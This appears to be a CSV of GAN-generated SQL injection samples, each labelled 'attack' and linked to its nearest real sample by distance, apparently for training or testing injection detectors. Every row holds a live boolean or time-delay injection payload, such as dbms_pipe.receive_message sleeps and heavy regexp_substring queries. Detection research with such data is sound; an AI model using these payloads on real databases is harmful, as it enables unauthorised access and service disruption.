id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000001,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,4.269107250796248
GAN_000002,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,7.47833087811767
GAN_000003,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,5.396729173599388
GAN_000004,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,6.445850177926183
GAN_000005,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,5.277769554568743
GAN_000006,attack,boolean,"-6848""   )    )    or 4071  =  5312",nearest_attack_euclidean,R000767,4.518104327091834
GAN_000007,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,5.676321233647819
GAN_000008,attack,boolean,"1""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""adwg"" like ""adwg",nearest_attack_euclidean,R000248,8.566252447989077
GAN_000009,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,5.466513962443662
GAN_000010,attack,boolean,"1""   )    )    as yutu where 1306  =  1306 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R001097,4.199085793562766
GAN_000011,attack,boolean,"-5840'  )   or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R001394,5.431770309214909
GAN_000012,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,6.364981854697098
GAN_000013,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,8.983504485783266
GAN_000014,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",nearest_attack_euclidean,R000493,4.6772145032886145
GAN_000015,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,5.029968361330322
